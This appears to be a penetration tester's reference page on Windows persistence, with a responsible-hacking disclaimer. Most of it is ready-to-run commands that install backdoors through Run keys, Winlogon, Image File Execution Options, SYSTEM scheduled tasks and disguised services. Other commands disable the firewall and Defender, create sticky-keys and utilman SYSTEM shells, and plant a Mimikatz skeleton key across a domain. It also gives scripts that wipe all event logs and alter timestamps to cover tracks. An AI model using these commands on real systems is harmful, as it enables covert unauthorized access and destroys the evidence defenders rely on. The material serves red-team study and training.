---
description: >-
  Various techniques for maintaining persistence.  Includes methods that can be
  accomplished both with and without elevated privileges. Will provide commands
  for both cmd.exe and PowerShell if possible.
---

# Persistence

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
{% endhint %}

## Tools

* [SharPersist - C# Binary - persistence toolkit - @h4wkst3r](https://github.com/fireeye/SharPersist)
  * Has numerous modules built-in to automate many different persistence methods
  * TODO: add tab to each applicable method below
* [on-load/on-close persistence PowerShell module](https://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79) - [@netbiosX](https://github.com/netbiosX)
  * Powershell module which writes registry keys that execute a backdoor payload of your choice when a certain Windows binary loads or closes (in this case notepad.exe).

## As a Low-Privilege User:

### Set a file as hidden

{% tabs %}
{% tab title="PowerShell" %}
Set a file as **Hidden**.  This can also be used to change other file property flags such as **Archive** and **ReadOnly**

```powershell
$file = (Get-ChildItem $file_to_change) #can shorten command with gci or ls
$file.attributes #Show the files attributes
#Normal

#Flip the bit of the Hidden attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
#Hidden

#To remove the 'Hidden' attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
#Normal
```
{% endtab %}

{% tab title="cmd.exe" %}
Set a file as **Hidden** (`-h`).  This can also be used to change other file property flags such as (`a`) Archive and (`r`) ReadOnly. Flags must be added separately (`-h -a -r` not `-har`).

```
attrib <C:\path\filename> #show the file attributes

attrib +h <C:\path\filename>

#to remove the hidden property
attrib -h <C:\path\filename>
```
{% endtab %}
{% endtabs %}

### Registry - HKCU&#x20;

#### Autoruns

The following registry keys can be used to create persistence by auto-running your backdoor.  Keys in HKCU do not require elevation to modify.

```
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
```

{% tabs %}
{% tab title="PowerShell" %}
Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`.&#x20;

**Run** and **RunOnce** keys are run each time a new user logs in.&#x20;

**RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```powershell
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $key_name -Value "$backdoor_path"
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name $key_name -Value "$backdoor_path"
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
```
{% endtab %}

{% tab title="cmd.exe" %}
Create values in the Autoruns keys in `HKCU\Software\Microsoft\Windows\CurrentVersion`. The option `/v` is the name you want, and `/d` is the path to your backdoor. &#x20;

**Run** and **RunOnce** keys are run each time a new user logs in.&#x20;

**RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point (!) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer.&#x20;

By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk (\*) to force the program to run even in Safe mode.

[Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
{% endhint %}

#### Persistence via cmd.exe

If you want a defined set of commands to run every time a command prompt is launched, you can specify an init script in the Command Processor AutoRun registry value.  Use an expandable string value (`REG_EXPAND_SZ`), which allows you to use environment variables like `%USERPROFILE%`.

```
reg.exe add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /t REG_EXPAND_SZ /d "%"USERPROFILE"%\init.cmd" /f
```

Then create a file called `init.cmd` in your `%USERPROFILE%` folder:

```
@echo off

command_A
command_B
...
```

These commands will be run every time a cmd prompt is started. &#x20;

{% hint style="danger" %}
**Warning!**&#x20;

This can cause an infinite loop if your **`init.cmd`** causes another cmd window to be launched, as each one will again run all of the commands in the init file!
{% endhint %}

To disable this, delete the registry key.

```
reg.exe delete "HKCU\Software\Microsoft\Command Processor" /v AutoRun
```

### Startup Folder

Create a batch script in the user startup folder to run when the user logs in.

{% tabs %}
{% tab title="PowerShell" %}
Create start.ps1 in `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"`.  Then have this PowerShell script call your backdoor in `$env:USERPROFILE\AppData\Local\Temp\`.

```powershell
#start.ps1
Start-Process -FilePath $env:USERPROFILE\AppData\Local\Temp\backdoor.ps1
```
{% endtab %}

{% tab title="cmd.exe" %}
Create .bat in `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"`.  Then have this batch file call your backdoor in `%USERPROFILE%\AppData\Local\Temp\`.

```
#start.bat
start /b $env:USERPROFILE\AppData\Local\Temp\backdoor.bat
```
{% endtab %}
{% endtabs %}

A better alternative would be to create a .lnk file in the startup folder which points to your script in another location.  This may be more OPSEC-safe, especially if the link is disguised. Use the PowerShell script linked below to create a (potentially hidden?) .lnk file using an icon appropriate for the environment:

[https://github.com/zweilosec/PowerShell-Administration-Tools/blob/master/New-Shortcut.ps1](https://github.com/zweilosec/PowerShell-Administration-Tools/blob/master/New-Shortcut.ps1)

### Scheduled Tasks

{% tabs %}
{% tab title="PowerShell" %}
These commands will allow your backdoor to be run when the specified user logs into the machine.  Combined with the cmd init autorun above this scheduled task could do something helpful or innocuous to avoid suspicion.

```powershell
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $backdoor_path"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "$username"
$principal = New-ScheduledTaskPrincipal "$username"
$settings = New-ScheduledTaskSettingsSet
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
Register-ScheduledTask $taskname -InputObject $task
```
{% endtab %}

{% tab title="cmd.exe" %}
This command will allow your backdoor to be run at a specified time. Combined with the cmd init autorun above this scheduled task could do something helpful or innocuous to avoid suspicion.

```
C:\Windows\system32\schtasks.exe"  /Create /F /RU System /SC DAILY /ST 10:39 /TN Updater /TR "C:\backdoor.exe"
```

* `/Create` – creates a new task&#x20;
* `/F` - forcefully creates the task and suppresses warnings if the task exists&#x20;
* `/RU` - Specifies the user context under which the task runs - System&#x20;
* `/SC` – Frequency of schedule – Daily&#x20;
* `/ST` – Time the task starts – 10:51&#x20;
* `/TN` – Name of the task – Updater&#x20;
* `/TR` – Path and filename of the executable to run - C:\backdoor.exe
{% endtab %}
{% endtabs %}

### Windows Services

May need some privileges for Windows services...

## As an Elevated-Privilege User

All commands below this header require some sort of elevated account privileges.  As I discover them, I will add which specific Windows privileges are required. &#x20;

### Windows Firewall

#### Disabling Windows Firewall

{% tabs %}
{% tab title="PowerShell" %}
To view the state and settings of all Windows firewall profiles (this output is not as pretty as the `netsh` command from cmd.exe, but can be manipulated like any PowerShell object):

```powershell
Get-NetFirewallProfile
```

To disable the Windows firewall for all network profiles:

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

&#x20;If you only want to disable the firewall for a specific profile, you can remove the profile name (Domain, Public, or Private) from the command.  This can be useful if you are unable to fully disable the firewall.
{% endtab %}

{% tab title="cmd.exe" %}
To view the states of all firewall profiles, and then disable all of them:

```
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off
```

If you cannot turn off all profiles, try each individual profile:

```
netsh advfirewall set currentprofile state off

netsh advfirewall set domainprofile state off

netsh advfirewall set privateprofile state off

netsh advfirewall set publicprofile state off
```

These commands can also be used in PowerShell.
{% endtab %}
{% endtabs %}

#### Create firewall rules

{% tabs %}
{% tab title="PowerShell" %}
TODO: add more

```powershell
New-NetFirewallRule -Name $rule_name -DisplayName $rule_name -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress $attackers_IP
```
{% endtab %}

{% tab title="cmd.exe" %}
add more
{% endtab %}
{% endtabs %}

### Disable Windows Defender

{% tabs %}
{% tab title="PowerShell" %}
TODO: add more info

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
{% endtab %}

{% tab title="cmd.exe" %}
add more info

```
sc config WinDefend start= disabled
sc stop WinDefend
```
{% endtab %}
{% endtabs %}

### Registry - HKLM&#x20;

#### Autoruns

The following keys can be used for persistence in addition to the low-privileged ones above.  Keys in HKLM require elevation to modify.

```
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
```

{% tabs %}
{% tab title="PowerShell" %}
Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`.&#x20;

**Run** and **RunOnce** keys are run each time a new user logs in.&#x20;

**RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```powershell
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $key_name -Value "$backdoor_path"
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name $key_name -Value "$backdoor_path"
New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
```
{% endtab %}

{% tab title="cmd.exe" %}
Create values in the Autoruns keys in `HKCU\Software\Microsoft\Windows\CurrentVersion`. The option `/v` is the name you want, and `/d` is the path to your backdoor.  **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.

```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point (!) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer.&#x20;

By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk (\*) to force the program to run even in Safe mode.

[Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
{% endhint %}

#### Winlogon Helper DLL

{% tabs %}
{% tab title="PowerShell" %}
Run backdoor during Windows logon

```powershell
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $backdoor" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, $backdoor" -Force
```
{% endtab %}

{% tab title="cmd.exe" %}
Run backdoor during Windows logon

```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
```
{% endtab %}
{% endtabs %}

#### GlobalFlag

add powershell

Add the following three keys to the registry to allow your backdoor to execute whenever Notepad.exe closes.

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```

#### Debugger

You can also abuse this to run your backdoor whenever Notepad.exe is opened with two registry keys:

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "pentestlab.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
```

This process can be automated by using [this](https://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79) PowerShell module from [netbiosX](https://github.com/netbiosX). &#x20;

### Scheduled Tasks

Scheduled Task to run your backdoor as NT AUTHORITY\SYSTEM, everyday at 9am.

add cmd.exe

```powershell
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $backdoor_path"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
$principal = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $Settings
Register-ScheduledTask $taskname -InputObject $task
```

### Windows Services

{% tabs %}
{% tab title="PowerShell" %}
Create a service that can start automatically or on-demand as needed.

```powershell
New-Service -Name "AppReadiness" -BinaryPathName "$backdoor_path" -Description "Gets apps ready for use the first time a user signs in to this PC and when adding new apps."
```
{% endtab %}

{% tab title="cmd.exe" %}
TODO: add more
{% endtab %}
{% endtabs %}

### Execute (remote) commands with DCOM

[https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

Win32\_DCOMApplication class. This COM object allows you to script components of MMC snap-in operations.

```powershell
$com = [type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$env:COMPUTERNAME")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.application.ExecuteShellCommand("C:\Windows\System32\Calc.exe",$null,$null,"7")
```

For this to work, you must also be local administrator of the remote system, Windows Defender must be bypassed or disabled, and (to do this remotely) the Windows Advanced Security Firewall must have the following rules enabled:

* COM+ Network Access (port 135)
* A rule to let dynamic ports for C:\windows\system32\mmc.exe in. Regular RPC-EPMAP rules from other services won’t work as they only allow traffic to svchost.exe.

If the firewall doesn’t let you in, you may receive messages such as:

> Exception calling “CreateInstance” with “1” argument(s): “Retrieving the COM class factory for remote component with CLSID {C08AFD90-F2A1-11D1-8455-00A0C91F3880} from machine target failed due to the following error: 800706ba target.”

The ShellExecute method of the object takes 4 parameters:

1. The complete path to the executable
2. The directory to be considered as current directory; you may want to usually pass NULL
3. A list of arguments to pass along to the executable. In case there is none, you can also pass NULL
4. The state of the windows (1 - Normal, 3 - maximized, 7 - minimized).&#x20;

Usually, you will want to use 7 as a value (minimized). You do not get any output back.

### Replacing Windows Binaries

Replace these binaries with your backdoor to enable easy persistence with minimal interference with normal users.  However, beware using these on systems where the user needs these accessibility tools!

{% tabs %}
{% tab title="Windows XP+" %}
| Feature            | Executable                            |
| ------------------ | ------------------------------------- |
| Sticky Keys        | C:\Windows\System32\sethc.exe         |
| Accessibility Menu | C:\Windows\System32\utilman.exe       |
| On-Screen Keyboard | C:\Windows\System32\osk.exe           |
| Magnifier          | C:\Windows\System32\Magnify.exe       |
| Narrator           | C:\Windows\System32\Narrator.exe      |
| Display Switcher   | C:\Windows\System32\DisplaySwitch.exe |
| App Switcher       | C:\Windows\System32\AtBroker.exe      |

In Metasploit : `use post/windows/manage/sticky_keys`
{% endtab %}

{% tab title="Windows 10+" %}
In addition to the older backdoor-able Windows binaries, in Windows 10 you can exploit a DLL hijacking vulnerability in the On-Screen Keyboard executable '**osk.exe'** by creating a malicious **HID.dll** in `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
{% endtab %}
{% endtabs %}

### Enable RDP on a remote host with PowerShell:

Remove the `-ComputerName $computername` property to run on the local machine.

```powershell
$RDPstate = Get-CimInstance -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $computername
$RDPstate.SetAllowTSConnections(1,1)
```

#### Disable RDP on a remote host:

```powershell
$RDPstate = Get-CimInstance -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $computername
$RDPstate.SetAllowTSConnections(0,0)
```

#### Check RDP status:

```powershell
$RDPstate = Get-CimInstance -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $ComputerName
$RDPstate.AllowTSConnections
```

The first argument represents AllowTSConnections(0 – disable, 1 – enable) and the second one represents ModifyFirewallException (0 – don’t modify firewall rules, 1 – modify firewall rules). You can read more about it at [https://docs.microsoft.com/en-us/windows/win32/termserv/win32-terminalservicesetting-setallowtsconnections](https://docs.microsoft.com/en-us/windows/win32/termserv/win32-terminalservicesetting-setallowtsconnections)

### RDP Backdoors

#### utilman.exe

After adding this registry key, RDP or physically log into the machine. At the login screen, press `Win+U` to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

#### sethc.exe

After adding this registry key, RDP or physically log into the machine. At the login screen, repeatedly press F5 when you are at the login screen to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

### Skeleton Key

Mimikatz gives you the opportunity to backdoor an entire domain at once by using the skeleton key module.  This must be run by a user with Domain Admin credentials to work properly.

```powershell
# Exploitation Command (run as Domain Admin):
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName $FQDN_of_DC

# Login using the password "mimikatz"
Enter-PSSession -ComputerName $ComputerName -Credential $Domain\$UserName
```

### Clear Windows Event Logs

Generates Windows event 1102 when you clear logs!

[https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil)

```
@echo off

FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo All Event Logs have been cleared!
goto theEnd

:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof

:noAdmin
echo Current user permissions to execute this .BAT file are inadequate.
echo This .BAT file must be run with administrative privileges.
echo Exit now, right click on this .BAT file, and select "Run as administrator".  
pause >nul

:theEnd
Exit
```

`Unblock-File -Path "<C:\Path\to\blocked\file>"`

#### Legacy Windows Log format

The `Clear-EventLog` cmdlet deletes all of the entries from the specified event logs on the local computer or on remote computers. To use `Clear-EventLog`, you must be a member of the Administrators group on the affected computer.

```powershell
Get-EventLog -List

<#
Max(K)   Retain   OverflowAction      Entries  Log
------   ------   --------------      -------  ---
15,168        0   OverwriteAsNeeded   20,792   Application
15,168        0   OverwriteAsNeeded   12,559   System
15,360        0   OverwriteAsNeeded   11,173   Windows PowerShell
#>
```

&#x20;`-List` Displays the list of event logs on the computer.

#### To list logs on other systems

```powershell
Get-EventLog -LogName System -ComputerName Server01, Server02, Server03
```

&#x20;If the **ComputerName** parameter isn't specified, `Get-EventLog` defaults to the local computer. The parameter also accepts a dot (`.`) to specify the local computer. The **ComputerName** parameter doesn't rely on Windows PowerShell remoting, so you can use this even if your computer is not configured to run remote commands.

&#x20;The `Remove-EventLog` cmdlet deletes an event log file from a local or remote computer and unregisters all its event sources for the log. You can also use this cmdlet to unregister event sources without deleting any event logs.

{% hint style="info" %}
**`Get-EventLog`** uses a Win32 API that is deprecated so the results may not be accurate. Use the **`Get-WinEvent`** cmdlet instead on systems running Windows Vista+.
{% endhint %}

#### List updated log formats in Windows Vista+

```powershell
Get-WinEvent -ListLog *
```

Warning! information overload! Lists each individual windows event rather than the log files

#### To clear all logs at once

{% tabs %}
{% tab title="PowerShell" %}
Lists all of the non-empty logfiles, then clears each one.

#### Legacy command (may not be completely accurate in Windows Vista+)

```powershell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
```

#### Windows Vista+ Logs

```powershell
Get-WinEvent -ListLog * | where {$_.RecordCount} | ForEach-Object -Process { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }
```

#### Windows built-in command (not pure PowerShell)

```powershell
wevtutil el | Foreach-Object {wevtutil cl "$_"}
```
{% endtab %}

{% tab title="cmd.exe" %}
List all event logs with `wevutil.exe el` then clear each one with `wevutil.exe cl`. &#x20;

```
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```
{% endtab %}
{% endtabs %}

&#x20;Can disable logging prior to doing things that would alert defenders, or can clear logs afterwards to cover tracks...TODO add more details

## Misc - to sort

### **Change File Modified Date and Time**

`(dir $file).LastWriteTime = New-object DateTime $YYYY,$MM,$DD`

## **Resources**

* [https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
* [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - @phraaaaaaa](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
* [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
* [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
* [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
* [https://pureinfotech.com/enable-disable-firewall-windows-10/](https://pureinfotech.com/enable-disable-firewall-windows-10/) - [Mauro Huc](https://pureinfotech.com/author/mauhuc/) [@pureinfotech](https://twitter.com/@pureinfotech)
* [http://vcloud-lab.com/entries/powershell/microsoft-powershell-remotely-write-edit-modify-new-registry-key-and-data-value](http://vcloud-lab.com/entries/powershell/microsoft-powershell-remotely-write-edit-modify-new-registry-key-and-data-value) - [@KunalAdapi](https://twitter.com/kunalUdapi)
* [https://www.tenforums.com/tutorials/16588-clear-all-event-logs-event-viewer-windows.html](https://www.tenforums.com/tutorials/16588-clear-all-event-logs-event-viewer-windows.html) - [Shawn Brink](https://www.tenforums.com/members/brink.html?s=c4719816f0e7a9450a073c5aeafb6024)
* [https://techibee.com/powershell/use-wmi-powershell-to-enable-or-disable-rdp-on-windows-server/3071](https://techibee.com/powershell/use-wmi-powershell-to-enable-or-disable-rdp-on-windows-server/3071)
* [https://stackoverflow.com/questions/17404165/how-to-run-a-command-on-command-prompt-startup-in-windows](https://stackoverflow.com/questions/17404165/how-to-run-a-command-on-command-prompt-startup-in-windows)



If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
